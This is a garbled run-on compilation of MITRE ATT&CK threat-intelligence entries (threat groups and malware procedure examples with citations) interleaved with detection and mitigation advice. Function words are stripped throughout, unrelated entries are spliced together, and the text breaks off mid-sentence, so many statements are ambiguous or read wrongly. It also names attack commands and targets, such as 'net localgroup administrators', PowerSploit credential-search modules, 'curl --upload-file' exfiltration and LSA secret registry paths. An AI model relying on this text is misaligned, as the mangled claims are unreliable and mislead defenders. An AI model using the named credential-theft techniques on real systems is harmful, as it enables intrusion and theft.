[LockerGoga](https://attack.mitre.org/software/S0372) observed deleting original launcher execution.(Citation: CarbonBlack LockerGoga 2019) [PoshC2](https://attack.mitre.org/software/S0378) implementation [netstat](https://attack.mitre.org/software/S0104) enumerate TCP UDP connections.(Citation: GitHub PoshC2) [Kimsuky](https://attack.mitre.org/groups/G0094) created mailing toolkit spearphishing attacks.(Citation: VirusBulletin Kimsuky October 2019) [Moses Staff](https://attack.mitre.org/groups/G1009) collected domain compromised network.(Citation: Checkpoint MosesStaff Nov 2021) [BlackMould](https://attack.mitre.org/software/S0564) cmd.exe parameters.(Citation: GALLIUM December 2019) feature disabled terminal command: <code>defaults write -g ApplePersistence -bool no</code>. technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. settings prevent applications running downloaded Apple Store mitigate issues. allowing unsigned applications mitigate risk. [Dragonfly](https://attack.mitre.org/groups/G0035) compromised legitimate websites host C2 malware modules.(Citation: Gigamon Berserk Bear October 2021) [Attor](https://attack.mitre.org/software/S0438)'s dispatcher disguises legitimate task (i.e., task description legitimate).(Citation: ESET Attor Oct 2019) [Pteranodon](https://attack.mitre.org/software/S0147) API calls.(Citation: Actinium February 2022) [TrickBot](https://attack.mitre.org/software/S0266) implant malicious code compromised device's firmware.(Citation: Eclypsium Trickboot December 2020) [FunnyDream](https://attack.mitre.org/software/S1044) stage collected including screen captures logged keystrokes locally.(Citation: Bitdefender FunnyDream Campaign November 2020) [Turla](https://attack.mitre.org/groups/G0010) shellcode download Meterpreter compromising victim.(Citation: ESET Turla Mosquito 2018) [Saint Bot](https://attack.mitre.org/software/S1018) collect IP address victim machine.(Citation: Malwarebytes Saint Bot April 2021) [TSCookie](https://attack.mitre.org/software/S0436) ICMP receive destination server.(Citation: JPCert BlackTech Malware September 2019) Monitor executed commands arguments attempt listing systems IP address, hostname, logical identifier network Lateral Movement current system. network devices, monitor executed commands AAA logs, unexpected unauthorized users. [LightNeuron](https://attack.mitre.org/software/S0395) configured exfiltrate data nighttime hours.(Citation: ESET LightNeuron 2019) [FIN6](https://attack.mitre.org/groups/G0037) Plink command-line utility create SSH tunnels C2 servers.(Citation: FireEye FIN6 April 2016) [Execution Guardrails](https://attack.mitre.org/techniques/T1480) mitigated preventative controls protect unintended targets compromised. targeted, efforts focused preventing adversary tools running earlier chain activity identifying subsequent malicious behavior compromised. [Maze](https://attack.mitre.org/software/S0449) operators created scheduled tasks masquerading "Windows Update Security", "Windows Update Security Patches", "Google Chrome Security Update" designed launch ransomware.(Citation: Sophos Maze VM September 2020)  [TrickBot](https://attack.mitre.org/software/S0266) injects browser redirection trick user providing login credentials fake modified page.(Citation: Fidelis TrickBot Oct 2016)(Citation: IBM TrickBot Nov 2016)(Citation: Totbrick Oct 2017)(Citation: Trend Micro Trickbot Nov 2018) [Bisonal](https://attack.mitre.org/software/S0268) check determine compromised running VMware.(Citation: Talos Bisonal Mar 2020) Holding Shift key logging prevents apps automatically. (Citation: Re-Open windows Mac) [SodaMaster](https://attack.mitre.org/software/S0627) hardcoded RSA key encrypt C2 traffic.(Citation: Securelist APT10 March 2021) [ZxShell](https://attack.mitre.org/software/S0412) collect local hostname, operating details, CPU speed, total physical memory.(Citation: Talos ZxShell Oct 2014)  [Ke3chang](https://attack.mitre.org/groups/G0004) performs account discovery commands <code>net localgroup administrators</code> <code>net "REDACTED" /domain</code> specific permissions groups.(Citation: Mandiant Operation Ke3chang November 2014) Monitor newly constructed files establish persistence executing malicious commands triggered user’s shell. Linux macOS systems, list file paths valid options located <code>/etc/shells</code> file. [Rocke](https://attack.mitre.org/groups/G0106) modified /etc/ld.so.preload hook libc functions hide installed dropper mining software process lists.(Citation: Anomali Rocke March 2019) (Citation: CrowdStrike Carbon Spider August 2021) [Carbanak](https://attack.mitre.org/software/S0030) malware communicates command server encrypted payload.(Citation: Kaspersky Carbanak) [Xbash](https://attack.mitre.org/software/S0341) execute malicious VBScript payloads victim’s machine.(Citation: Unit42 Xbash Sept 2018) Proactively search credentials Registry attempt remediate risk. [Leafminer](https://attack.mitre.org/groups/G0077) tools retrieving login password information, including LaZagne Mimikatz.(Citation: Symantec Leafminer July 2018) [SILENTTRINITY](https://attack.mitre.org/software/S0692)'s `amsiPatch.py` module disable Antimalware Scan Interface (AMSI) functions.(Citation: GitHub SILENTTRINITY Modules July 2019) [SNUGRIDE](https://attack.mitre.org/software/S0159) communicates C2 server HTTP.(Citation: FireEye APT10 April 2017) [SILENTTRINITY](https://attack.mitre.org/software/S0692) remove artifacts compromised host, including created Registry keys.(Citation: GitHub SILENTTRINITY Modules July 2019) [Taidoor](https://attack.mitre.org/software/S0011) cmd.exe temp folder.(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) [SombRAT](https://attack.mitre.org/software/S0615) <code>upload</code> decrypt upload files storage.(Citation: BlackBerry CostaRicto November 2020)(Citation: CISA AR21-126A FIVEHANDS 2021) [Kevin](https://attack.mitre.org/software/S1020) Base32 encode chunks output files exfiltration.(Citation: Kaspersky Lyceum October 2021) [Naikon](https://attack.mitre.org/groups/G0019) administrator credentials lateral movement compromised networks.(Citation: Bitdefender Naikon April 2021) [PLEAD](https://attack.mitre.org/software/S0435) communications command control (C2) servers.(Citation: JPCert PLEAD Downloader June 2018)(Citation: TrendMicro BlackTech June 2017) Ensure proper process file permissions prevent adversaries disabling interfering logging deleting modifying .evtx logging files. Ensure .evtx files, located <code>C:\Windows\system32\Winevt\Logs</code>(Citation: win_xml_evt_log), proper file permissions limited, legitimate access audit policies detection.  [Grandoreiro](https://attack.mitre.org/software/S0531) download stage hardcoded URL loader's code.(Citation: IBM Grandoreiro April 2020)(Citation: ESET Grandoreiro April 2020) [Dragonfly](https://attack.mitre.org/groups/G0035) batch script gather folder file names victim hosts.(Citation: US-CERT TA18-074A)(Citation: Gigamon Berserk Bear October 2021)(Citation: CISA AA20-296A Berserk Bear December 2020) Monitor API calls device drivers SMART (Self-Monitoring, Analysis Reporting Technology) (Citation: SanDisk SMART) (Citation: SmartMontools) disk monitoring reveal malicious manipulations components. Otherwise, technique difficult detect malicious activity components purview OS security integrity mechanisms. [VERMIN](https://attack.mitre.org/software/S0257) C2 communications.(Citation: Unit 42 VERMIN Jan 2018) detect adversary credentials in [Valid Accounts](https://attack.mitre.org/techniques/T1078). [WarzoneRAT](https://attack.mitre.org/software/S0670) send collected victim data C2 server.(Citation: Check Warzone Feb 2020) [Maze](https://attack.mitre.org/software/S0449) checked language machine function <code>GetUserDefaultUILanguage</code> terminated execution language matches entry predefined list.(Citation: McAfee Maze March 2020) software store credentials Registry, ensure accounts limited permissions abused adversary. Ensure local administrator accounts complex, unique passwords. Monitor newly executed processes attempt gather language victim infer geographical location host. UAC's privilege elevation standard users <code>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]</code> automatically deny elevation requests, add: <code>"ConsentPromptBehaviorUser"=dword:00000000</code>. enabling installer detection users adding: <code>"EnableInstallerDetection"=dword:00000001</code>. prompt password installation log attempt. disable installer detection, add: <code>"EnableInstallerDetection"=dword:00000000</code>. prevent potential elevation privileges exploitation process UAC detecting installer, installation process continue logged.  (Citation: Executable Installers Vulnerable) [Kimsuky](https://attack.mitre.org/groups/G0094) exfiltrated stolen files data actor-controlled Blogspot accounts.(Citation: Talos Kimsuky Nov 2021) [Revenge RAT](https://attack.mitre.org/software/S0379) plugin credential harvesting.(Citation: Cylance Shaheen Nov 2018) [The White Company](https://attack.mitre.org/groups/G0089) obfuscated payloads packing.(Citation: Cylance Shaheen Nov 2018) [down_new](https://attack.mitre.org/software/S0472) ability base64 encode C2 communications.(Citation: Trend Micro Tick November 2019) Monitor unusual queries cloud provider's storage service. Activity originating unexpected sources improper permissions set allowing access data. Additionally, detecting failed attempts user object, escalation privileges user, access object indication suspicious activity. [BLUELIGHT](https://attack.mitre.org/software/S0657) download additional files host.(Citation: Volexity InkySquid BLUELIGHT August 2021)  [Koadic](https://attack.mitre.org/software/S0250) perform process injection reflective DLL.(Citation: Github Koadic) [Prikormka](https://attack.mitre.org/software/S0113) rundll32.exe load DLL.(Citation: ESET Operation Groundbait) [PowerSploit](https://attack.mitre.org/software/S0194) modules search Windows Registry stored credentials: <code>Get-UnattendedInstallFile</code>, <code>Get-Webconfig</code>, <code>Get-ApplicationHost</code>, <code>Get-SiteListPassword</code>, <code>Get-CachedGPPPassword</code>, <code>Get-RegistryAutoLogon</code>.(Citation: Pentestlab Stored Credentials) (Citation: US-CERT FALLCHILL Nov 2017) [Agent Tesla](https://attack.mitre.org/software/S0331) exploited Office vulnerabilities CVE-2017-11882 CVE-2017-8570 execution delivery.(Citation: SentinelLabs Agent Tesla Aug 2020)  [PLEAD](https://attack.mitre.org/software/S0435) ability execute commands compromised host.(Citation: JPCert PLEAD Downloader June 2018) [Lurid](https://attack.mitre.org/software/S0010) performs XOR encryption.(Citation: Villeneuve 2011) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) malware existing file file share server users unwittingly launch install malware additional systems.(Citation: Secureworks BRONZE BUTLER Oct 2017) [ComRAT](https://attack.mitre.org/software/S0126) SSL/TLS encryption HTTP-based C2 channel. [ComRAT](https://attack.mitre.org/software/S0126) public key cryptography RSA AES encrypted email attachments Gmail C2 channel.(Citation: ESET ComRAT 2020)(Citation: CISA ComRAT Oct 2020)  Internet scanners patterns malicious content designed collect host hardware visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)
Much activity occurrence false positive rate, visibility target organization, detection difficult defenders. Detection efforts focused stages adversary lifecycle, Initial Access. [Egregor](https://attack.mitre.org/software/S0554) rundll32 execution.(Citation: Cybereason Egregor Nov 2020) [Turla](https://attack.mitre.org/groups/G0010) gathered credentials Windows Credential Manager tool.(Citation: Symantec Waterbug Jun 2019)	 [Mustang Panda](https://attack.mitre.org/groups/G0129) malicious links including links directing victims Google Drive folder.(Citation: Crowdstrike MUSTANG PANDA June 2018)(Citation: McAfee Dianxun March 2021)(Citation: Proofpoint TA416 Europe March 2022) [Torisma](https://attack.mitre.org/software/S0678) send victim data actor-controlled C2 server.(Citation: McAfee Lazarus Nov 2020) images software updated migrate SNMPv3.(Citation: Cisco Blog Legacy Device Attacks) [Emotet](https://attack.mitre.org/software/S0367) relied users clicking malicious attachment delivered spearphishing.(Citation: Trend Micro Banking Malware Jan 2019)(Citation: Carbon Black Emotet Apr 2019)(Citation: IBM IcedID November 2017) [Misdat](https://attack.mitre.org/software/S0083) network traffic communicates raw socket.(Citation: Cylance Dust Storm) [Javali](https://attack.mitre.org/software/S0528) obfuscated libraries hinder detection analysis.(Citation: Securelist Brazilian Banking Malware July 2020) impact generated golden ticket, reset built-in KRBTGT account password twice, invalidate existing golden tickets created KRBTGT hash Kerberos tickets derived it.(Citation: CERT-EU Golden Ticket Protection) Ensure proper policies implemented dictate secure enrollment deactivation MFA user accounts. [Carberp](https://attack.mitre.org/software/S0484) user mode rootkit techniques remain hidden system.(Citation: Prevx Carberp March 2011) [TEMP.Veles](https://attack.mitre.org/groups/G0088) ports 4444, 8531, 50501 C2.(Citation: FireEye TRITON 2019) [Empire](https://attack.mitre.org/software/S0363) capable capturing screenshots Windows macOS systems.(Citation: Github PowerShell Empire) (Citation: FireEye APT37 Feb 2018) Monitor windows registry values disable services render services unavailable legitimate users. Monitor systemd timer unit files unexpected modification events /etc/systemd/system, /usr/lib/systemd/system/, ~/.config/systemd/user/ directories, symbolic links [Patchwork](https://attack.mitre.org/groups/G0040) Base64 encode C2 traffic.(Citation: Cymmetria Patchwork) [Metamorfo](https://attack.mitre.org/software/S0455) requires user double-click executable malicious HTA file download malicious installer.(Citation: FireEye Metamorfo Apr 2018)(Citation: ESET Casbaneiro Oct 2019)  application control configured block execution InstallUtil.exe required network prevent potential misuse adversaries. (Citation: Unit 42 MechaFlounder March 2019) Configure access controls firewalls limit access critical systems domain controllers. cloud environments support separate virtual private cloud (VPC) instances enable segmentation cloud systems. [Molerats](https://attack.mitre.org/groups/G0021) malicious links email trick users RAR archive running executable.(Citation: Kaspersky MoleRATs April 2019)(Citation: Unit42 Molerat Mar 2020)  [Threat Group-3390](https://attack.mitre.org/groups/G0027) exfiltrated stolen data Dropbox.(Citation: Trend Micro DRBControl February 2020) [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors modified version [Mimikatz](https://attack.mitre.org/software/S0002) called Wrapikatz dump credentials. dumped credentials domain controllers.(Citation: Dell TG-3390)(Citation: SecureWorks BRONZE UNION June 2017) [Shark](https://attack.mitre.org/software/S1019) collect GUID targeted machine.(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021) Monitor detect files directory organization login match authorized updates server's content. [IceApple](https://attack.mitre.org/software/S1022)'s Credential Dumper module dump LSA secrets registry keys, including: `HKLM\SECURITY\Policy\PolEKList\default`, `HKLM\SECURITY\Policy\Secrets\*\CurrVal`, `HKLM\SECURITY\Policy\Secrets\*\OldVal`.(Citation: CrowdStrike IceApple 2022) [JPIN](https://attack.mitre.org/software/S0201) permissions victim user.(Citation: PLATINUM April 2016) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors compromised VPN accounts gain access victim systems.(Citation: McAfee Night Dragon) [Poseidon Group](https://attack.mitre.org/groups/G0033) obtains saves victim network interfaces addresses.(Citation: Kaspersky Poseidon Group) [Axiom](https://attack.mitre.org/groups/G0001) compressed encrypted data prior exfiltration.(Citation: Novetta-Axiom) [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) collect network interface MAC address infected host.(Citation: TrendMicro MacOS April 2018)(Citation: Trend Micro MacOS Backdoor November 2020) [SpeakUp](https://attack.mitre.org/software/S0374) Python scripts.(Citation: CheckPoint SpeakUp Feb 2019) Ensure proper user permissions prevent adversaries disabling interfering security services. [SUGARDUMP](https://attack.mitre.org/software/S1042) stolen credentials data C2 server.(Citation: Mandiant UNC3890 Aug 2022) [Cuba](https://attack.mitre.org/software/S0625) ability encrypt data add ".cuba" extension encrypted files.(Citation: McAfee Cuba April 2021)  [REvil](https://attack.mitre.org/software/S0496) connect disable Symantec server victim's network.(Citation: Cylance Sodinokibi July 2019) Monitor executed commands arguments actions delete Windows event logs (via PowerShell) Establish centralized logging activity cloud compute infrastructure components. Monitor suspicious sequences events, creation multiple snapshots short period time. reduce false positives, valid change management procedures introduce identifier logged change tag header) supported cloud provider, distinguish valid, expected actions malicious ones. [Cobian RAT](https://attack.mitre.org/software/S0338) creates autostart Registry key ensure persistence.(Citation: Zscaler Cobian Aug 2017) [RogueRobin](https://attack.mitre.org/software/S0270) save file C2 server.(Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit42 DarkHydrus Jan 2019) [ShimRatReporter](https://attack.mitre.org/software/S0445) gathered list installed software infected host.(Citation: FOX-IT 2016 Mofang) [StrifeWater](https://attack.mitre.org/software/S1034) variety APIs execution.(Citation: Cybereason StrifeWater Feb 2022) [CozyCar](https://attack.mitre.org/software/S0046)'s main method communicating C2 servers HTTPS.(Citation: F-Secure CozyDuke) [Sliver](https://attack.mitre.org/software/S0633) inject code local remote processes.(Citation: Bishop Fox Sliver Framework August 2019)(Citation: GitHub Sliver C2) [Regin](https://attack.mitre.org/software/S0019) hidden file store components.(Citation: Kaspersky Regin) [GoldenSpy](https://attack.mitre.org/software/S0493) ports 9005 9006 network traffic, 9002 C2 requests, 33666 WebSocket, 8090 download files.(Citation: Trustwave GoldenSpy June 2020) [CALENDAR](https://attack.mitre.org/software/S0025) malware communicates events Google Calendar.(Citation: Mandiant APT1)(Citation: Mandiant APT1 Appendix) Integrating multi-factor authentication (MFA) organizational policy greatly reduce risk adversary gaining control valid credentials additional tactics initial access, lateral movement, collecting information. [WastedLocker](https://attack.mitre.org/software/S0612) copied random file Windows System32 folder <code>%APPDATA%</code> location hidden filename.(Citation: NCC WastedLocker June 2020) [Ryuk](https://attack.mitre.org/software/S0446) C$ network share lateral movement.(Citation: Bleeping - Ryuk WoL) [KONNI](https://attack.mitre.org/software/S0356) collect IP address victim’s machine.(Citation: Talos Konni 2017) Application control prevent running executables masquerading files. Depending specific method phishing, detections vary. Monitor suspicious email activity, numerous accounts receiving messages single unusual/unknown sender. Filtering based DKIM+SPF header analysis detect email sender spoofed.(Citation: Anti Spoofing)(Citation: ACSC Email Spoofing)
When links, monitor references uncategorized known-bad sites. URL inspection email (including expanding shortened links) detect links leading malicious sites.
Monitor social media traffic suspicious activity, including messages requesting abnormal file data transfers (especially involving unknown, suspicious accounts). [Bazar](https://attack.mitre.org/software/S0534) inject code calling <code>VirtualAllocExNuma</code>.(Citation: Cybereason Bazar July 2020) [Gamaredon Group](https://attack.mitre.org/groups/G0047) compiled source code downloader infected built-in <code>Microsoft.CSharp.CSharpCodeProvider</code> class.(Citation: ESET Gamaredon June 2020)	 [AuditCred](https://attack.mitre.org/software/S0347) search folders files system.(Citation: TrendMicro Lazarus Nov 2018) remote desktop gateways. [Kazuar](https://attack.mitre.org/software/S0265) downloads additional plug-ins load victim’s machine, including ability upgrade replace binary.(Citation: Unit 42 Kazuar 2017) [PoisonIvy](https://attack.mitre.org/software/S0012) creates key Registry entries malicious executable dropped disk.(Citation: Symantec Darkmoon Aug 2005) [Penquin](https://attack.mitre.org/software/S0587) execute remote commands bash scripts.(Citation: Leonardo Turla Penquin 2020) [Comnie](https://attack.mitre.org/software/S0244) executes batch script store discovery %TEMP%\info.dat uploads temporarily file remote C2 server.(Citation: Palo Alto Comnie) Monitor newly executed processes Windows Dynamic Data Exchange (DDE) execute arbitrary commands. [LaZagne](https://attack.mitre.org/software/S0349) credentials chats, databases, mail, WiFi.(Citation: GitHub LaZagne Dec 2018) [Bazar](https://attack.mitre.org/software/S0534) downloaded Windows BITS functionality.(Citation: NCC Team9 June 2020) [Uroburos](https://attack.mitre.org/software/S0022) custom packer.(Citation: Symantec Waterbug) [Diavol](https://attack.mitre.org/software/S0659) command traverse files directories path.(Citation: Fortinet Diavol July 2021)  [MacSpy](https://attack.mitre.org/software/S0282) persists Launch Agent.(Citation: objsee mac malware 2017) [Neoichor](https://attack.mitre.org/software/S0691) download additional files compromised host.(Citation: NICKEL December 2021) [Nebulae](https://attack.mitre.org/software/S0630) discover logical drive including drive type, space, volume information.(Citation: Bitdefender Naikon April 2021) decrypting memory, [RARSTONE](https://attack.mitre.org/software/S0055) downloads DLL file C2 server loads memory space hidden Internet Explorer process. “downloaded” file dropped system.(Citation: Camba RARSTONE) (Citation: FireEye APT41 Aug 2019) [KillDisk](https://attack.mitre.org/software/S0607) retrieves hard disk calling <code>CreateFileA \\.\PHYSICALDRIVE0</code> API.(Citation: Trend Micro KillDisk 1) Monitor executed commands arguments actions create/modify tasks. Tasks created Windows management tools [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [PowerShell](https://attack.mitre.org/techniques/T1059/001), additional logging configured gather data. Monitor newly constructed network connections received untrusted hosts.  [APT28](https://attack.mitre.org/groups/G0007) pass hash lateral movement.(Citation: SIR 19) Adversaries DLLs execute technique. Identify block malicious software executed search hijacking application control solutions capable blocking DLLs loaded legitimate software. [CookieMiner](https://attack.mitre.org/software/S0492) <code>curl --upload-file</code> command exfiltrate data HTTP.(Citation: Unit42 CookieMiner Jan 2019) (Citation: MalwareBytes LazyScripter Feb 2021) Update software regularly employing patch management internal enterprise endpoints servers. Monitor executed commands arguments attempt extract credential material Security Account Manager (SAM) database in-memory techniques Windows Registry SAM database stored. [Carberp](https://attack.mitre.org/software/S0484) hooked Windows API functions steal credentials.(Citation: Prevx Carberp March 2011) Configure user permissions roles access cloud storage.(Citation: Azure Storage Security, 2019) Implement strict Identity Access Management (IAM) controls prevent access storage solutions applications, users, services require access.(Citation: Amazon S3 Security, 2019) Ensure temporary access tokens issued permanent credentials, access granted entities internal security boundary.(Citation: Amazon  AWS Temporary Security Credentials) [Cobalt Strike](https://attack.mitre.org/software/S0154) collect data local system.(Citation: Cobalt Strike TTPs Dec 2017)(Citation: Cobalt Strike Manual 4.3 November 2020) (Citation: Kaspersky WIRTE November 2021) [Saint Bot](https://attack.mitre.org/software/S1018) attempted bypass UAC `fodhelper.exe` escalate privileges.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) Networks development testing content users set servers enterprise network vulnerable systems servers properly secured limit unauthenticated network share access network/system isolation Monitor attempts programs inject dump browser process memory. [Transparent Tribe](https://attack.mitre.org/groups/G0134) dynamic DNS services set C2.(Citation: Proofpoint Operation Transparent Tribe March 2016) [MuddyWater](https://attack.mitre.org/groups/G0069) compromised parties compromised accounts send spearphishing emails targeted attachments recipients.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: FireEye MuddyWater Mar 2018)(Citation: Securelist MuddyWater Oct 2018)(Citation: ClearSky MuddyWater June 2019)(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021)	(Citation: DHS CISA AA22-055A MuddyWater February 2022) Monitor newly executed processes attempt listing security software, configurations, defensive tools, sensors installed cloud environment. file uploaded, [Machete](https://attack.mitre.org/software/S0409) delete machine.(Citation: ESET Machete July 2019)  [Mongall](https://attack.mitre.org/software/S1026) ability decrypt payload prior execution.(Citation: SentinelOne Aoqin Dragon June 2022) [SUGARUSH](https://attack.mitre.org/software/S1049) port 4585 TCP connection C2.(Citation: Mandiant UNC3890 Aug 2022) [Sandworm Team](https://attack.mitre.org/groups/G0034) exploited vulnerabilities PowerPoint OLE objects (CVE-2014-4114) Word crafted TIFF images (CVE-2013-3906).(Citation: iSight Sandworm Oct 2014)(Citation: TrendMicro Sandworm October 2014)(Citation: McAfee Sandworm November 2013) [Sliver](https://attack.mitre.org/software/S0633) enumerate files target system.(Citation: GitHub Sliver File August 2021) [StrifeWater](https://attack.mitre.org/software/S1034) encrypt C2 traffic XOR hard coded key.(Citation: Cybereason StrifeWater Feb 2022) [MURKYTOP](https://attack.mitre.org/software/S0233) capability retrieve OS.(Citation: FireEye Periscope March 2018) (Citation: Cybereason Kimsuky November 2020)(Citation: KISA Operation Muzabi) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware WhiskeyDelta-Two function attempts rename administrator’s account.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) [Skidmap](https://attack.mitre.org/software/S0468) encrypted main payload 3DES.(Citation: Trend Micro Skidmap)  [QakBot](https://attack.mitre.org/software/S0650) file sizes evade detection.(Citation: Trend Micro Qakbot 2020)(Citation: IB Ransomware September 2020) [Windshift](https://attack.mitre.org/groups/G0112) links embedded e-mails lure victims executing malicious code.(Citation: SANS Windshift August 2018) [CozyCar](https://attack.mitre.org/software/S0046) Twitter backup C2 channel Twitter accounts configuration file.(Citation: F-Secure CozyDuke) [PlugX](https://attack.mitre.org/software/S0013) modify characteristics folders hide compromised user.(Citation: Proofpoint TA416 Europe March 2022) [AADInternals](https://attack.mitre.org/software/S0677) create export authentication certificates, including Azure joined/registered devices.(Citation: AADInternals Documentation) [yty](https://attack.mitre.org/software/S0248) communicates C2 server retrieving Google Doc.(Citation: ASERT Donot March 2018) [Net Crawler](https://attack.mitre.org/software/S0056) list credentials gathered credential dumping guess passwords accounts spreads network.(Citation: Cylance Cleaver) Network/Host intrusion prevention systems, antivirus, detonation chambers employed prevent documents fetching executing malicious payloads.(Citation: Anomali Template Injection MAR 2018) [NotPetya](https://attack.mitre.org/software/S0368) [PsExec](https://attack.mitre.org/software/S0029) propagate network.(Citation: Talos Nyetya June 2017)(Citation: US-CERT NotPetya 2017) (Citation: Symantec Black Vine) Loading, unloading, manipulating modules Linux systems detected monitoring commands: <code>modprobe</code>, <code>insmod</code>, <code>lsmod</code>, <code>rmmod</code>, <code>modinfo</code> (Citation: Linux Loadable Kernel Module Insert Remove LKMs) Adversaries commands target loading malicious module ensure properly compiled. (Citation: iDefense Rootkit Overview) Adversaries execute commands identify exact version running Linux kernel download multiple versions .ko (kernel object) files running system.(Citation: Trend Micro Skidmap) LKMs require Linux headers (specific target kernel) compile properly. These typically operating systems package manager installed normal package.

On macOS, monitor execution <code>kextload</code> commands user installed kernel extensions performing abnormal malicious activity (such creating network connections). Monitor rows <code>kext_policy</code> table. KextPolicy stores list user approved (non Apple) kernel extensions partial history loaded kernel modules SQLite database, <code>/var/db/SystemPolicyConfiguration/KextPolicy</code>.(Citation: User Approved Kernel Extension Pike’s)(Citation: Purves Kextpocalypse 2)(Citation: Apple Developer Configuration Profile) [FoggyWeb](https://attack.mitre.org/software/S0661) decrypted memory Lightweight Encryption Algorithm (LEA)-128 key decoded XOR key.(Citation: MSTIC FoggyWeb September 2021) [APT29](https://attack.mitre.org/groups/G0016) variety tools including [Mimikatz](https://attack.mitre.org/software/S0002), [SDelete](https://attack.mitre.org/software/S0195), [Tor](https://attack.mitre.org/software/S0183), [meek](https://attack.mitre.org/software/S0175), [Cobalt Strike](https://attack.mitre.org/software/S0154).(Citation: Mandiant Easy Breach)(Citation: F-Secure Dukes)(Citation: FireEye APT29 Nov 2018) [Stuxnet](https://attack.mitre.org/software/S0603) extracts writes driver files match times legitimate files.(Citation: Symantec W.32 Stuxnet Dossier) [BoxCaon](https://attack.mitre.org/software/S0651) download files.(Citation: Checkpoint IndigoZebra July 2021) [FIN6](https://attack.mitre.org/groups/G0037) collected schemas user accounts systems running SQL Server.(Citation: Visa FIN6 Feb 2019) [Bad Rabbit](https://attack.mitre.org/software/S0606) executable installs modified bootloader prevent normal boot-up.(Citation: Secure List Bad Rabbit) [Kimsuky](https://attack.mitre.org/groups/G0094) signed files EGIS CO,. Ltd..(Citation: ThreatConnect Kimsuky September 2020) [Pony](https://attack.mitre.org/software/S0453) Adobe Reader icon downloaded file trustworthy.(Citation: Malwarebytes Pony April 2016)	 [APT28](https://attack.mitre.org/groups/G0007) loader Trojan adds Registry key <code>HKCU\Environment\UserInitMprLogonScript</code> establish persistence.(Citation: Unit 42 Playbook Dec 2017) [Peirates](https://attack.mitre.org/software/S0683) stolen service account tokens perform operations. enables adversaries switch valid service accounts.(Citation: Peirates GitHub) [Avaddon](https://attack.mitre.org/software/S0640) attempts database processes.(Citation: Arxiv Avaddon Feb 2021) Determine websites spearphishing business operations blocking access activity monitored poses risk. [Kinsing](https://attack.mitre.org/software/S0599) Unix scripts execute commands victim environment.(Citation: Aqua Kinsing April 2020) (Citation: Proofpoint TA505 Sep 2017)(Citation: IBM TA505 April 2020) [Imminent Monitor](https://attack.mitre.org/software/S0434) decoded malware components dropped system.(Citation: QiAnXin APT-C-36 Feb2019) Monitor newly executed processes attempt gather domain trust relationships identify lateral movement opportunities Windows multi-domain/forest environments. [menuPass](https://attack.mitre.org/groups/G0045) malicious Office documents email spearphishing campaigns executables disguised documents.(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: FireEye APT10 April 2017)(Citation: FireEye APT10 Sept 2018)(Citation: District Court NY APT10 Indictment December 2018) [Ramsay](https://attack.mitre.org/software/S0458) Windows API functions <code>WriteFile</code>, <code>CloseHandle</code>, <code>GetCurrentHwProfile</code> collection file storage operations. [Ramsay](https://attack.mitre.org/software/S0458) execute embedded components <code>CreateProcessA</code> <code>ShellExecute</code>.(Citation: Eset Ramsay 2020) Monitor newly executed processes removable media mounted.  Monitor newly constructed active directory objects, Windows EID 5137. [Rifdoor](https://attack.mitre.org/software/S0433) additional bytes data launching, saved changed version <code>C:\ProgramData\Initech\Initech.exe</code>.(Citation: Carbon Black HotCroissant April 2020) [Astaroth](https://attack.mitre.org/software/S0373) obfuscates JScript code, XOR-based algorithm encrypt payloads keys.(Citation: Cybereason Astaroth Feb 2019)(Citation: Securelist Brazilian Banking Malware July 2020) [NanoCore](https://attack.mitre.org/software/S0336) modify victim's firewall.(Citation: DigiTrust NanoCore Jan 2017)(Citation: PaloAlto NanoCore Feb 2016) [Carberp](https://attack.mitre.org/software/S0484) maintained persistence placing current user's startup folder.(Citation: Prevx Carberp March 2011) [REvil](https://attack.mitre.org/software/S0496) PowerShell delete volume shadow copies download files.(Citation: Secureworks GandCrab REvil September 2019)(Citation: Talos Sodinokibi April 2019)(Citation: Intel 471 REvil March 2020)(Citation: IB Ransomware 2020) [APT18](https://attack.mitre.org/groups/G0026) obfuscates strings payload.(Citation: PaloAlto DNS Requests 2016) [Lucifer](https://attack.mitre.org/software/S0532) identify process owns remote connections.(Citation: Unit 42 Lucifer June 2020) [Dark Caracal](https://attack.mitre.org/groups/G0070)'s version [Bandook](https://attack.mitre.org/software/S0234) communicates server TCP port payloads Base64 encoded suffixed string “&&&”.(Citation: Lookout Dark Caracal Jan 2018) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors `net time` command advanced reconnaissance.(Citation: Cybereason OperationCuckooBees 2022) [Anchor](https://attack.mitre.org/software/S0504) determine hostname linux version compromised host.(Citation: Medium Anchor DNS July 2020) [Orz](https://attack.mitre.org/software/S0229) gather victim OS version 64 32 bit.(Citation: Proofpoint Leviathan Oct 2017) [Leviathan](https://attack.mitre.org/groups/G0065) WMI execution.(Citation: Proofpoint Leviathan Oct 2017) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) HTTPS C2 communications.(Citation: CISA MAR SLOTHFULMEDIA October 2020) [Dragonfly](https://attack.mitre.org/groups/G0035) created accounts victims, including administrator accounts, appeared tailored individual staging target.(Citation: US-CERT TA18-074A) Data [SPACESHIP](https://attack.mitre.org/software/S0035) copies staging compressed zlib. Bytes rotated positions XOR'ed 0x23.(Citation: FireEye APT30) [RTM](https://attack.mitre.org/software/S0148) record keystrokes keyboard virtual keyboard.(Citation: ESET RTM Feb 2017)(Citation: Unit42 Redaman January 2019) [Mongall](https://attack.mitre.org/software/S1026) relied user malicious document execution.(Citation: SentinelOne Aoqin Dragon June 2022) [Chimera](https://attack.mitre.org/groups/G0114) 